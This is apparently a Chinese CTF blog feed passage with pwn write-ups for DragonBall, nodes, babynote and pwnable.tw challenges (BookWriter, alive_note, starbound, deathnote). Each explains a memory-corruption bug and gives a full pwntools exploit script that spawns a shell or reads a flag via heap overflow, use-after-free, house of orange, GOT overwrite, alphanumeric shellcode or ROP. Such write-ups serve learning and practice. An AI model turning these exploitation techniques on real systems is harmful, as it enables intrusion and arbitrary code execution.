整数溢出漏洞在于buy()中，仅检测是否money!=0的情况，也就是说构造一个money不为5的倍数即可无限制购买，很显然可以先买一个再卖出，就剩余13个金币，无论如何都不可能为0，因此可以无限制购买龙珠，最后达成愿望。 最终，利用脚本如下： 1234567891011121314151617181920212223242526272829303132333435from pwn import *debug = 0elf = ELF('./DragonBall')if debug: p = process('./DragonBall') context.log_level = 'debug'else: p = remote('111.230.132.82', 40002) context.log_level = 'debug'p.recvuntil('You choice: ')p.sendline('1')p.recvuntil('You choice: ')p.sendline('2')for i in range(7): p.recvuntil('You choice: ') p.sendline('1')p.recvuntil('You choice: ')p.sendline('4')p.recvuntil('Tell me your wish: ')payload = asm(shellcraft.sh())payload = payload.ljust(0x66,'a')p.sendline(payload+'b')p.recvuntil('ab')stack_leak = u32(p.recv(5)[1:])print 'stack_leak : ',hex(stack_leak)offset = 0xffa7cc48-0xffa7cbc0payload_addr = stack_leak - offsetprint 'shellcode : ',hex(payload_addr)p.recvuntil('is it right?\n(Y/N) ')p.sendline('a'*0x38+p32(stack_leak)+p32(payload_addr))p.interactive() notes程序的大概内容是程序维护这一个链表，链表各块使用malloc分配，大小为0x38（56）个字节，最开始四字节是一个unsigned int，命名为value，相当于一个索引，之后的48个字节为data，最后四字节为下一个块的地址。 程序利用value值遍历这个链表，找到这个链表的第一个value相同的项进行修改。 在这期间没有任何溢出问题。 漏洞位置漏洞出现的原因有2点 程序利用bss段上的某一个值对data长度进行限定,初始值为48 程序输出是先用sprintf函数拷贝到bss段上某一个位置，在用puts进行打印，而由于该缓存字符串的长度限定有问题，在建立了100个字节以上的节点时，会出现溢出现象，而溢出的点恰好为1中提到的data长度，将其覆盖成为字符’s’，也就是115，进一步造成了堆溢出。 漏洞利用漏洞利用思路是首先构造100个节点，造成堆溢出，此时可以的输入可以覆盖到下一块的地址部分，也就是说可以劫持链表，利用程序功能造成内存任意读写。 首先将某数据库的下一块地址覆盖为puts@got地址，这样利用打印功能可以泄露libc的puts函数地址。 再对该块进行写操作，利用的索引即是泄露的puts地址，因为该块已经在链表中了，将该块地址覆写为一个one_gadget地址，最终利用puts函数的调用触发，即劫持got表。 利用脚本如下：（io貌似还有点问题没有解决） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293from pwn import *import timedebug = 0elf = ELF('./nodes')if debug: p = process('./nodes') libc = ELF('/lib/i386-linux-gnu/libc.so.6') context.log_level = 'debug'else: p = remote('111.230.132.82', 40003) context.log_level = 'debug' libc = ELF('./libc.so.6')def add(value,data): p.recvuntil('please input your choice:') p.sendline('1') p.recvuntil('Value:') p.send(str(value)+'\0') p.recvuntil('Data:') p.sendline('') #time.sleep() p.recvuntil('nodes\n')#def changefor i in range(1,103): add(i,'a')p.recvuntil('please input your choice:')p.sendline('3')p.recvuntil('please input your choice:')p.sendline('2\0')p.recvuntil('Node\'s value:')p.sendline('101')p.recvuntil('New value:')p.sendline('101')p.recvuntil('New data:')p.sendline('a'*48+p32(elf.got['puts']))p.recvuntil('please input your choice:')p.sendline('3')p.recvuntil('Value:101\n')p.recvline()p.recvline()a = p.recvline()puts_addr = int(a[6:-1],10)libc.address = puts_addr - libc.symbols['puts'] print '[+]puts addr:',hex(puts_addr)p.recvuntil('please input your choice:')p.sendline('2')p.recvuntil('Node\'s value:')p.sendline(a[6:-1])p.recvuntil('New value:')p.sendline(str(libc.address+0x3ac5c))p.recvuntil('New data:')p.sendline('')p.recvuntil('choice:')p.sendline('4')p.interactive()'''0x3ac5c execve("/bin/sh", esp+0x28, environ)constraints: esi is the GOT address of libc [esp+0x28] == NULL0x3ac5e execve("/bin/sh", esp+0x2c, environ)constraints: esi is the GOT address of libc [esp+0x2c] == NULL0x3ac62 execve("/bin/sh", esp+0x30, environ)constraints: esi is the GOT address of libc [esp+0x30] == NULL0x3ac69 execve("/bin/sh", esp+0x34, environ)constraints: esi is the GOT address of libc [esp+0x34] == NULL0x5fbc5 execl("/bin/sh", eax)constraints: esi is the GOT address of libc eax == NULL0x5fbc6 execl("/bin/sh", [esp])constraints: esi is the GOT address of libc [esp] == NULL''' babynote一道比较典型的UAF漏洞。 逻辑分析程序逻辑是一个可以任意输入的note，每一个note分为了两部分：block和content block的结构为： 123+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| size（int） | content address | function ptr | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ content的大小为size值 add函数中详细的为每一个变量赋值，尤其是function ptr，初始值为某自实现的puts函数 print函数中显示了调用function ptr函数的参数和方法，可以想到如果可以劫持function ptr就可以执行任意命令 在程序中要求最多可以生成3个note，分别存储在bss段上的一个数组内 利用思路显然，由于在edit的时候并没有检查堆块是否已经被释放，因此，存在明显的UAF(Use After Free)漏洞。 而且删除堆块时程序的释放顺序是先释放content，再释放block，由于fastbin的LIFO性质，可以明显知道 123add（0xc，&apos;p4nda&apos;）delete(0)add(0xc,&apos;p4nda&apos;) 使用的堆块是不变的，因此想要用分配得到的content控制一个note的block，进而控制function ptr的方法必须让堆块分配不平衡。 比如 12345add(0x100,&apos;p4nda&apos;)add(0xc,&apos;p4nda&apos;)delete(1)delete(0)add(0xc,payload) 这样分配，可以导致第0个note的block分配给第2个note的block，而第1个note的block会分配给第二个note作为content，是可以编辑的，进一步可以劫持控制流。 地址泄露此题开启了PIE保护，不可以使用题目文件中的固定地址了。同时需要利用获取system地址，来得到shell，因此泄露一个libc地址是很必要的。 这时存在一个堆块分配与释放的机制问题，堆块在libc的内存管理中主要分fastbin、unsorted bin、 small bin、large bin、top、mmap来管理，其中fastbin管理的是较小堆块，当内存小于global_max_fast值时，在内存释放时会挂载到fastbin中，而稍大一些的small bin、large bin在释放时，当不与top头相邻，会先挂载到unsorted bin中去。 而如何寻找到各个bin的地址？libc在bss段上设置了一个结构体变量叫 main_arena，变量的各个成员就是每个bin的开头，如图 在libc符号表中，没有mainarena的符号，但该地址与\_mallochook很近，通常利用 \_mall_hook来定位main_arena 在各个bin链表中，不同的链表有不同的组织方式，如fastbin是单链表，unsorted bin、small bin是双链表，largebin更为复杂。因此，常用的地址泄露的方式是从unsorted bin泄露，当可以任意读取unsorted bin数据时，堆块的fd位置即为main_arena中unsorted bin地址。 如在此题中就可以用这种方式泄露 劫持控制流12345add(0x100,&apos;p4nda&apos;)add(0xc,&apos;p4nda&apos;)delete(1)delete(0)add(0xc,payload) 当按上述方法控制了第1块的block时，修改payload即可完成对控制流的劫持，如利用泄露的libc地址获取system()地址，将其覆盖到function ptr时，在将size覆盖成 sh\x00\x00，利用print(1)进行触发即可获得一个shell +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | &apos;sh\0\0&apos; | anything | system address | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 利用脚本如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import *debug = 0elf = ELF('./babynote')if debug: p = process('./babynote') libc = ELF('/lib/i386-linux-gnu/libc.so.6') context.log_level = 'debug'else: p = remote('111.230.132.82', 40004) context.log_level = 'debug' libc = ELF('./libc.so.6')def add(size,content): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('size:') p.sendline(str(size)) p.recvuntil('content:') p.send(content)def edit(index,content): p.recvuntil('Your choice :') p.sendline('2') p.recvuntil('index:') p.sendline(str(index)) p.recvuntil('content') p.send(content)def print_note(index): p.recvuntil('Your choice :') p.sendline('3') p.recvuntil('index:') p.sendline(str(index))def delete(index): p.recvuntil('Your choice :') p.sendline('4') p.recvuntil('index:') p.sendline(str(index))add(0x100,'p4nda')add(0xc,'p4nda')delete(1)delete(0)print_note(0)libc_leak_addr = u32(p.recv(4))libc.address = libc_leak_addr - libc.symbols['__malloc_hook']-48-0x18print '[+] system :',hex(libc.symbols['system'])add(0xc,'sh\0\0'+p32(next(libc.search('/bin/sh')))+p32(libc.symbols['system']))print_note(1)p.interactive() 题目]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【PWNABLE.TW】 BookWriter 解题思路]]></title>
    <url>%2F2017%2F12%2F15%2Fpwnable-tw-bookwriter%2F</url>
    <content type="text"><![CDATA[背景最开始是发到了看雪论坛上的 最近在学习house_of_orange技术，house_of_orange技术已经和house_of_lore、house_of_Spirit一样，成为一种堆溢出利用技巧，思路来自ctf-HITCON-2016的同名题目。最近学习到这里，看了github上shellphish/how2heap中的讲解和多篇题解对漏洞触发条件依然不太理解，恰巧做到了pwnable.tw上的BookWriter题目，真正实践了一次。 题目分析首先这是一道逻辑清晰的题目，主要有添加书页、浏览书页、编辑书页和查看信息功能。 其中定义了两个int[8]数组在BSS段，分别存储书页的地址和书页内容大小信息，两数组在BSS段上位置相邻。 添加操作使用从0~8顺序查找的方式，进行堆块申请，堆块大小由用户输入，并且用户此时可获得一次输入堆块内容的机会。 查看书页内容操作，用户可输入0~7的数字查询书页内容。 编辑操作，用户同样可输入0~7数字，根据存储在size数组的大小进行写入，并利用strlen函数，重新更新书页的size值。 查看信息。打印一系列信息。 题目中给出的libc.so版本是 2.23 #漏洞分析 堆地址泄露可以主要到bss段上的排列顺序是char author_name[0x40]、int page[8]、int page_size[8]。在输入author_name时，输入长度是0x40，打印时使用%s，造成泄露page中存储的堆地址。 堆溢出堆溢出漏洞有两处，第一处在edit函数中，用户输入完数据后，程序使用strlen函数重置page_size的值，当用户输入与下一堆块中的size相连时，strlen会返回用户输入长度+下一堆块size，再次编辑造成了下一堆块的size被篡改。第二处在于add函数中对允许写入的判断是i&lt;=8,page[i]==NULL。可以发现&amp;page[8] = &amp;page[0]的地址，当page[0]被覆盖为一个堆块地址时，造成了对page[0]超长写入，可以覆盖到很远的地址,可以说是一个等号引发的血案了。 漏洞利用整个程序中没有出现free函数，常规的UAF、Double free都不存在。看了很多的house_of_orange资料，恰好想到使用这种方法，这种攻击成功需要如下条件（shellphish上提供的方法）： heap地址 2. 堆溢出 3. libc地址 4. libc 2.23及以下版本（2.24版本开始对vtable有check，不过也可以绕过） house_of_orange思路简介： 首先修改top块的size，然后申请一个较大的块（不大于mmap申请的阈值，大于top块当前大小），当修改的size满足一定条件时，原来的top会被释放到unsorted bin。 通过堆溢出覆写原top内容，主要是构造IO_file_plus指针中的函数虚表，并伪造bk指针为unsorted bin攻击做铺垫。 当再次申请内存时，造成unsorted bin attack，将\__IO_list_all覆写为原top头地址，由于unsorted bin结构的破坏，程序异常，会在malloc中调用malloc_printerr函数进行错误打印，在malloc_printerr中调用__libc_message，进一步调用abort()，再调用 _IO_flush_all_lockp()，在其中调用了_IO_OVERFLOW(fp,EOF)，这个函数是使用虚表调用，如果可以覆盖调用的虚表，就可以达到执行system(‘/bin/sh’)。 针对上述步骤可以在这道题中一一对照实现。 首先是修改top块的size，可以通过add一个块，edit两次进行对top头size的覆写，经过修改，top的地址与大小如图所示： 这个size块覆写必须满足两点要求，top块才可被释放到unsorted bin 1.size&gt;=MINSIZE 2. pre_inuse 2. top地址+size-1 是页对齐的（以000结尾，比如此题中0x187a020+0xfe1-1 = 0x187b000） 当满足这一点时，再次申请一个较大堆块时就会把这个top块释放到unsorted bin中，值得注意的是，此题有一个在info函数中调用了scanf函数，scanf内部会申请一个0x1000大小的块，且不释放，就可以达到将原top头释放到unsorted bin的目的，并且可以此函数可以泄露堆地址。 由于申请小堆块是从unsorted bin直接切割，可以通过分配得到的堆块泄露libc地址（main_arena+88）。 接下来就可以堆溢出构造unsorted bin攻击了。 首先看漏洞的触发，在genops.c的_IO_flush_all_lockp (int do_lock)函数中，fp会从_IO_list_all开始，当不满足某条件时，循环修改fp = fp-&gt;chain，执行 _IO_OVERFLOW，_IO_list_all是一个_IO_FILE_plus类型的指针，在ibc中。 查看_IO_list_all内容，_IO_list_all是一个_IO_FILE_plus指针，指向_IO_2_2_stdout， 其中包含一个虚表vtable，用于函数调用，包括许多函数 因此，思路可以是通过unsorted bin，将_IO_list_all指针内容修改，可以改到main_arena+88也就是unsorted bin头的地址，当改成这个地址时，其内容时不满足执行_IO_OVERFLOW，转而去寻找位于chain这个位置的地址，继续执行。为了继续构造，可以去把这个地方的地址写成我们能控制内存的地址，这个位置是main_arena+216，是在fastbin链中，堆块大小为0x60的fastbin的地址，可以通过把unsorted bin中的原top挂到fastbin的方法来进一步利用，可把原top头的地址修改成0x61，并且修改bk指针为&amp;_IO_list_all-0x10。这样通过malloc新建堆块时，由于unsorted bin中的堆块不唯一，就会把unsorted bin中堆块释放到bin中去，释放原top头时，会把该块挂载到fastbin[4]，也就是我们期待的位置去，然后再处理bk指针，也就是_IO_list_all，会触发堆块大小为0的错误，进一步触发malloc_printerr 等一系列函数… 下一步就是在原top内伪造_IO_file_plus结构体，满足 1.fp-&gt;mode&gt;0 2._IO_vtable_offset (fp) ==0 3.fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base 即可，构造的结构体如下：（不小心按错退出了，与原先的top地址有变化） 最终malloc一个堆块即可触发漏洞，获得shell EXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273from pwn import *debug = 1elf = ELF('./bookwriter')if debug: p = process('./bookwriter') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug' else: pass def add(num,content): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Size of page :') p.sendline(str(num)) p.recvuntil('Content :') p.send(content)def view(num): p.recvuntil('Your choice :') p.sendline('2') p.recvuntil('Index of page :') p.sendline(str(num))def edit(num,content): p.recvuntil('Your choice :') p.sendline('3') p.recvuntil('Index of page :') p.sendline(str(num)) p.recvuntil('Content:') p.send(content)def info(num,content): p.recvuntil('Your choice :') p.sendline('4') p.recvuntil('(yes:1 / no:0) ') p.sendline(str(num)) if(num): p.recvuntil('Author :') p.sendline(content) else: passdef leak_heap(): p.recvuntil('Your choice :') p.sendline('4') p.recvuntil('a'*0x40) result = u64(p.recvline()[0:-1].ljust(8,'\0')) p.recvuntil('(yes:1 / no:0) ') p.sendline('0') return result #int(resultq[0:-1],10)#gdb.attach(p,'b *0x400bdd')p.recvuntil('Author :')p.sendline('a'*0x40)add(0x18,'a'*0x18) #0edit(0,'a'*0x18)edit(0,'\0'*0x18+'\xe1'+'\x0f'+'\0')heap_addr = leak_heap()for i in range(8): add(0x40,'p4nda123')#2view(2)p.recvuntil('p4nda123')libc_addr = u64(p.recvline()[0:-1].ljust(8,'\0')) libc.address = libc_addr - 88 - 0x10 - libc.symbols['__malloc_hook']print 'libc_addr:',hex(libc_addr)print 'system: ',hex(libc.symbols['system'])print 'heap: ',hex(heap_addr)edit(0,'\0'*0x290+'/bin/sh\0'+p64(0x61)+p64(libc_addr)+p64(libc.symbols['_IO_list_all']-0x10)+p64(2)+p64(3)+p64(0)*9+p64(libc.symbols['system']) + p64(0)*11 + p64(heap_addr+0x120+0x60+0x170) ) p.recvuntil('Your choice :')p.sendline('1')p.recvuntil('Size of page :')p.sendline(str(0x10))p.interactive() referencehttps://www.anquanke.com/post/id/84987 https://zhuanlan.zhihu.com/p/31079264?utm_medium=social&amp;utm_source=qq http://www.cnblogs.com/shangye/p/6268981.html https://github.com/shellphish/how2heap/blob/master/house_of_orange.c https://www.sourceware.org/ml/libc-alpha/2016-02/msg00502.html]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>PWNABLE.TW</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【PWNABLE.TW】 alive_note 解题思路]]></title>
    <url>%2F2017%2F12%2F06%2Fpwnable-tw-alivenote%2F</url>
    <content type="text"><![CDATA[突然发现已经两个月没写过WP了，愧疚- -… 此题也算一道分数很高的题目，主要考察Shellcode的编写。 题目功能又是一道题目逻辑很简单的题。 首先提供了三个函数 查看，删除，添加 查看函数： 此函数中readint()使用atoi进行解析，没有检查小于0的情况，造成越解读，可以泄露libc地址（然并卵） 添加函数中一样有这个问题，并且可以任意写， 显然是一道覆盖got表的题，并且没有开启NX保护，就是可以写shellcode。 查看一下check函数 不太清楚__ctype_b_loc是什么check，不过可以fuzz一下。 发现只有如下这些是可以输入的 12345678910'''0x0 0x20 0x30 0x31 0x32 0x33 0x34 0x35 0x36 0x37 0x38 0x39 0x41 0x42 0x430x44 0x45 0x46 0x47 0x48 0x49 0x4a 0x4b 0x4c 0x4d 0x4e 0x4f 0x50 0x51 0x520x53 0x54 0x55 0x56 0x57 0x58 0x59 0x5a 0x61 0x62 0x63 0x64 0x65 0x66 0x670x68 0x69 0x6a 0x6b 0x6c 0x6d 0x6e 0x6f 0x70 0x71 0x72 0x73 0x74 0x75 0x760x77 0x78 0x79 0x7a \x00 0 1 2 3 4 5 6 7 8 9 A B C D E F G H I J K L M N O P Q RS T U V W X Y Z a b c d e f g h i j k l m n o p q r s t u v w x y z''' 而这些机器码构成的汇编就可以做很多事情了，比如参考这个文档给出的汇编指令对应关系 https://wenku.baidu.com/view/bf5227ecaeaad1f346933f86.html 漏洞利用作为其他的限制，shellcode每块不许超过8字节，并且使用strdup建立堆块，也就是说不能有\x00。 根据堆的分配机制，每个堆块分配的大小应该是16字节，并且是连续的，因此可以shellcode链的方法进行跳转，比如使用JNE语句等。 选择覆盖的函数使用free函数，在delete函数时触发，原因是此时在寄存器里会有堆块相关的值。 此时调用free函数时，寄存器的值为： 12345678910111213141516eax 0x811f018 0x811f018 ；堆块地址ecx 0x0 0x0edx 0x0 0x0ebx 0x0 0x0esp 0xffd9597c 0xffd9597cebp 0xffd959a8 0xffd959a8esi 0xf76b7000 0xf76b7000edi 0xf76b7000 0xf76b7000eip 0x80484e0 0x80484e0 &lt;free@plt&gt;eflags 0x296 [ PF AF SF IF ]cs 0x23 0x23ss 0x2b 0x2bds 0x2b 0x2bes 0x2b 0x2bfs 0x0 0x0gs 0x63 0x63 以此寄存器的值构造shellcode，shellcode块之间使用3个小块填充即可 12345678910111213141516171819202122232425'''read(0,heap,size)shellcode 1push eax ;P eax=heappop ecx ;Y push ebx ;Spop eax ;Xpush 0x7a ;jzjnz 0x38 ;u8eax = 0 ebx = 0 ecx = heap edx = 0shellcode 2 pop edx ;Zdec eax ;Hxor byte ptr[ecx+0x46],al ;0a5jnz 0x39shellcode 3xor al,0x33 ;4cxor byte ptr[ecx+0x47],al ;0a5jnz 0x39shellcode 4push 0x33 ;j3pop eax ;Xxor al,0x30 ;40'''+'2L' #EXP 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182from pwn import *debug = 0bad=[]other=[]good = []elf = ELF('./alive_note')context.log_level = 'debug'if debug: p = process('./alive_note') #$libc = ELF('/lib/i386-linux-gnu/libc.so.6') #off = 0x001b2000 context.log_level = 'debug' #gdb.attach(p,'b *0x80488d3') #gdb.attach(p,'b *0x80488C9')else: p = remote('chall.pwnable.tw', 10300) #libc = ELF('./libc_32.so.6')def test(): for i in range(256): p=process('./alive_note') p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Index') p.sendline('1') p.recvuntil('Name :') p.sendline(''+chr(i)) try: res = p.recvline() if('Done' in res): good.append(i) elif ('must be ' in res ): bad.append(i) else: other.append(i) except: bad.append(i) p.close()def add(num,name): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Index :') p.sendline(str(num)) p.recvuntil('Name :') p.sendline(name)def show(num): p.recvuntil('Your choice :') p.sendline('2') p.recvuntil('Index :') p.sendline(str(num))def delete(num): p.recvuntil('Your choice :') p.sendline('3') p.recvuntil('Index :') p.sendline(str(num))def padding(): add(9,'p4nda') add(9,'p4nda') add(9,'p4nda')shellcode1 = '''push eax pop ecx push ebx pop eax push 0x7a '''shellcode2 = '''pop edx dec eax xor byte ptr[ecx+0x45],al'''shellcode3='''xor al,0x33 xor byte ptr[ecx+0x46],al '''shellcode4='''push 0x33 pop eax xor al,0x30 '''print asm(shellcode1)if __name__ == '__main__': note = 0x804a080 add((elf.got['free']-note)/4,asm(shellcode1)+'u8') padding() add(0,asm(shellcode2)+'u9') padding() add(1,asm(shellcode3)+'u9') padding() add(2,asm(shellcode4)+'2L') padding() #gdb.attach(p,'b *0x80488ea') #add(1,'PPPPPPP') delete(1) p.sendline('\x90'*0x48+asm(shellcraft.sh())) p.interactive()'''read(0,heap,size)shellcode 1push eax ;P eax=heappop ecx ;Y push ebx ;Spop eax ;Xpush 0x7a ;jzjnz 0x38 ;u8eax = 0 ebx = 0 ecx = heap edx = 0shellcode 2 pop edx ;Zdec eax ;Hxor byte ptr[ecx+0x46],al ;0a5jnz 0x39shellcode 3xor al,0x33 ;4cxor byte ptr[ecx+0x47],al ;0a5jnz 0x39shellcode 4push 0x33 ;j3pop eax ;Xxor al,0x30 ;40''''''eax 0x811f018 0x811f018ecx 0x0 0x0edx 0x0 0x0ebx 0x0 0x0esp 0xffd9597c 0xffd9597cebp 0xffd959a8 0xffd959a8esi 0xf76b7000 0xf76b7000edi 0xf76b7000 0xf76b7000eip 0x80484e0 0x80484e0 &lt;free@plt&gt;eflags 0x296 [ PF AF SF IF ]cs 0x23 0x23ss 0x2b 0x2bds 0x2b 0x2bes 0x2b 0x2bfs 0x0 0x0gs 0x63 0x63'''''' test() print 'good:',good print 'bad:',bad print 'other:',other for i in good: print hex(i),''' '''0x0 0x20 0x30 0x31 0x32 0x33 0x34 0x35 0x36 0x37 0x38 0x39 0x41 0x42 0x43 0x44 0x45 0x46 0x47 0x48 0x49 0x4a 0x4b 0x4c 0x4d 0x4e 0x4f 0x50 0x51 0x52 0x53 0x54 0x55 0x56 0x57 0x58 0x59 0x5a 0x61 0x62 0x63 0x64 0x65 0x66 0x67 0x68 0x69 0x6a 0x6b 0x6c 0x6d 0x6e 0x6f 0x70 0x71 0x72 0x73 0x74 0x75 0x76 0x77 0x78 0x79 0x7a\x00 0 1 2 3 4 5 6 7 8 9 A B C D E F G H I J K L M N O P Q R S T U V W X Y Z a b c d e f g h i j k l m n o p q r s t u v w x y z''']]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>PWNABLE.TW</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【PWNABLE.TW】 starbound 解题思路]]></title>
    <url>%2F2017%2F10%2F13%2Fpwnable-tw-starbound%2F</url>
    <content type="text"><![CDATA[题目功能此题的代码量很大，看了一整天的逻辑代码，没发现什么问题… 整个函数的逻辑主要是红框中两个指针的循环赋值和调用，其中第一个指针是主功能函数，第二个数组是子功能函数。 函数的漏洞主要在main函数中，main函数中使用了strtol函数将用户输入转换为字符串，并根据此转换结果，对子函数进行访问。 当用户输入过大或过小时，会导致越界访问的问题，其中，strtol函数的返回值可能为负数。 bss段中，用户输入的名称最开始是随机生成的，但用户可以更改。而此字段在函数指针数组上面，也就是说，用户可以通过控制名称的方式获得一次指令执行的机会 漏洞利用查看一下安全保护机制 可以使用ROP的方式来利用漏洞。由于main函数中用户可以输入0x100长的字符给v5，因此，v5可作为ROP的存放位置，在name中找到一个gadget使得EIP跳转到位于栈上v5字段内即可。 由于此题没有附带libc，也没找到可以泄露地址的漏洞，因此在ROP中使用了在plt区域有的open、read、puts函数来打印flag，其中从dalao那里get的知识点是，read函数的第一个参数是一个int类型的值， 用于标识文件身份，其中0 ： stdin、1：stdout、2：stderr，本题内没有打开未关闭的文件，因此read(3,&amp;buf,0x10)完全可以读出flag。 另外，恰巧在最近接触到了return to dl-resolve的原理：http://www.freebuf.com/articles/system/149214.html 此题恰巧也符合使用该技术的先决条件，但貌似ld.so做了保护，没有成功，在网上没有找到相关的保护手段，通过调试发现ld.so以偏移量获取了程序.gnu.version的内容，进一步运算，但我构造的偏移量过大， 导致运算超出了可读写的范围，造成程序崩溃。暂未找到其他方法，此坑以后再填。 暂存未成功的return-to-dl-resolve代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364from pwn import *debug = 1context(arch='i386',os='linux',endian='little')context.log_level='debug' elf = ELF('./starbound')if debug: p=process('./starbound') file = '~/Desktop/pwn/tw/starbound/flag'else: p=remote('chall.pwnable.tw',10202)file = '/home/starbound/flag\0\0\0\0'file = '/bin/sh\0' + '\0'*(len(file)-len('/bin/sh\0'))gadget = 0x08048e48bss_function = 0x08058150bss_name = 0x080580D0shellcode = file + p32(gadget) + p32(0x0805509c) + p32(0x00002807) + 'a'*8 print '[*] shellcode len ',len(shellcode)print '[*] ',hex(bss_name + len(shellcode) - 0x80481dc)shellcode = file + p32(gadget) + p32(0x0805509c) + p32(0x00002807) + 'a'*8 + p32(0xe1)+p32(0)+p32(0)+p32(0x12) distance3 = bss_name + len(shellcode) - 0x80484fcprint '[*] ',hex(distance3)shellcode = file + p32(gadget) + p32(0x0805509c) + p32(0x000ff207) + 'a'*8 + p32(distance3)+p32(0)+p32(0)+p32(0x12) + 'system\x00'shellcode = file + p32(gadget) + p32(0x0805509c) + p32(0x00002807) + 'a'*8 + p32(0xe1)+p32(0)+p32(0)+p32(0x12) p.recvuntil('&gt; ')p.send('6')p.recvuntil('&gt; ')p.send('2')p.recvuntil(': ')p.sendline(shellcode)p.recvuntil('&gt; ')distance = (bss_name + len(file) - bss_function)/4#print str(distance) gdb.attach(p,'b *0x0804A65D')distance2 = bss_name + len(file) + 4 - 0x80487c8cat_flag_exp = str(distance-1) + '\0' + 'a'*4 + p32(0x8048940) + p32(distance2) + p32(0xdeadbeef) + p32(bss_name)'''+ p32(elf.symbols['open']) + p32(gadget) + p32(bss_name) \+ p32(0)+ 'a'*(0x1c-8) + p32(elf.symbols['read']) + p32(gadget) + p32(3) + p32(bss_name+20) + p32(0x40) +'a'*(0x1c-12) + p32(elf.symbols['puts']) + p32(0xdeadbeef) + p32(bss_name+20)''''''$ readelf -d starbound | grep JMPREL 0x00000017 (JMPREL) 0x80487c8gdb-peda$ x /2x 0x80487c8+0x1200x80488e8: 0x0805509c 0x00002807readelf -d starbound | grep SYM 0x00000006 (SYMTAB) 0x80481dc 0x0000000b (SYMENT) 16 (bytes) 0x6ffffff0 (VERSYM) 0x80486f2$ readelf -d starbound | grep STRTAB 0x00000005 (STRTAB) 0x80484fc'''p.sendline(cat_flag_exp)p.interactive()#0x08048e48 : add esp, 0x1c ; ret EXP1234567891011121314151617181920212223242526272829303132333435from pwn import *debug = 0context(arch='i386',os='linux',endian='little')context.log_level='debug' elf = ELF('./starbound')if debug: p=process('./starbound') file = '~/Desktop/pwn/tw/starbound/flag'else: p=remote('chall.pwnable.tw',10202)file = '/home/starbound/flag\0\0\0\0'gadget = 0x08048e48shellcode = file + p32(gadget) + 'a'*4p.recvuntil('&gt; ')p.send('6')p.recvuntil('&gt; ')p.send('2')p.recvuntil(': ')p.send(shellcode)p.recvuntil('&gt; ')bss_function = 0x08058150bss_name = 0x080580D0distance = (bss_name + len(file) - bss_function)/4#print str(distance) #gdb.attach(p,'b *0x0804A65D')cat_flag_exp = str(distance-1) + '\0' + 'a'*4 + p32(elf.symbols['open']) + p32(gadget) + p32(bss_name) \+ p32(0)+ 'a'*(0x1c-8) + p32(elf.symbols['read']) + p32(gadget) + p32(3) + p32(bss_name+20) + p32(0x40) +'a'*(0x1c-12) + p32(elf.symbols['puts']) + p32(0xdeadbeef) + p32(bss_name+20)p.sendline(cat_flag_exp)p.interactive()#0x08048e48 : add esp, 0x1c ; ret]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>PWNABLE.TW</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【PWNABLE.TW】 deathnote 解题思路]]></title>
    <url>%2F2017%2F09%2F29%2Fpwnable-tw-deathnote%2F</url>
    <content type="text"><![CDATA[一开始特别懵的一道题。 题目功能题目逻辑比较简单，大概增加和删除和打印三个功能： show函数中，打印各日记内容，由于这题没有给出libc文件，应该不需要泄露地址，估计用处不大： delete函数中，正常的free，然后指针修改为null，可能不存在漏洞，唯一的bug在于read_int()函数中 readint函数使用了atoi函数，当输入是“-12”这样的负数时，造成读越界，但是由于在delete函数中，用处不是特别大 最后，add函数 函数的逻辑是在note数组中写入malloc的返回的指针，并且同样用了readint函数，可以发现存在越界写的问题，而note变量在bss段上，可以想到覆写got表： 漏洞利用检查一下文件开启的保护，没有开启NX保护，也就是可以写入shellcode，这样put@got指向malloc返回地址，malloc块中写入shellcode，便可以获得shell。 而针对用户输入，还有一个函数用来检测， 因此需要保证用户输入范围是从2F~7F范围内。即考察shellcode的编写。 常见的shellcode思路是利用int 80h陷入软中断， 并使得eax内容为0x0b，ebx指向一个字符串”/bin/sh”，ecx、edx置0。如shellcraft.sh() 12345678910111213141516171819202122/* execve(path=&apos;/bin///sh&apos;, argv=[&apos;sh&apos;], envp=0) *//* push &apos;/bin///sh\x00&apos; */push 0x68push 0x732f2f2fpush 0x6e69622fmov ebx, esp/* push argument array [&apos;sh\x00&apos;] *//* push &apos;sh\x00\x00&apos; */push 0x1010101xor dword ptr [esp], 0x1016972xor ecx, ecxpush ecx /* null terminate */push 4pop ecxadd ecx, esppush ecx /* &apos;sh\x00&apos; */mov ecx, espxor edx, edx/* call execve() */push SYS_execve /* 0xb */pop eaxint 0x80 但在汇编以后，不能满足我们的要求。 根据某师傅博客中写到，此题可用的汇编指令如下: 